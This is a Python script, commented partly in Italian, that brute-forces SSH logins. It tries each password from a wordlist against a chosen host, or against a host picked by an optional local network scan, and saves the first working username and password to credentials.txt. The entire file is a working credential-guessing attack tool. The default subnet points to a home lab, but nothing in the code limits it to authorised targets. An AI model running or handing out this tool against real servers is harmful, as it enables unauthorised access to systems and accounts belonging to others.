import paramiko
import socket 
import time
from colorama import init, Fore

# AGGIUNTA: importa il modulo di scansione
from network_scanner import get_target_interactive

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
    #Inizializzazione del client SSH
    client = paramiko.SSHClient()

    #Aggiunta alla lista degli host conosciuti
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname = hostname, username = username, password = password, timeout = 1)
    except socket.timeout:
        #Host che non risponde
        print(f"{RED}[-] Host: {hostname} non risponde.{RESET}")
        return False
    except paramiko.AuthenticationException:
        #Credenziali errate
        print(f"[-] Host: {hostname} - Credenziali errate.{RESET}")
        return False
    except paramiko.SSHException:
        #Errore per la connessione SSH
        print(f"{BLUE}[-] Host: {hostname} - Errore nella connessione SSH.{RESET}")
        #Pausa di 10 secondi
        time.sleep(10)
        return is_ssh_open(hostname, username, password)
    else:
        #Connessione riuscita
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
    
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", nargs="?", help="Hostname or IP Address of SSH Server to bruteforce (opzionale se usi --scan).")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    parser.add_argument("--scan", action="store_true", help="Scansiona automaticamente la rete e scegli l'host.")
    parser.add_argument("-n", "--network", default="192.168.122.0/24", help="Rete da scandire (es. 192.168.1.0/24).")

    # parse passed arguments
    args = parser.parse_args()
    
    # AGGIUNTA: gestione della modalità scansione
    if args.scan:
        target = get_target_interactive(args.network)
        if target is None:
            print(f"{RED}[-] Nessun target selezionato. Uscita...{RESET}")
            exit(0)
        host = target
    else:
        host = args.host
    
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break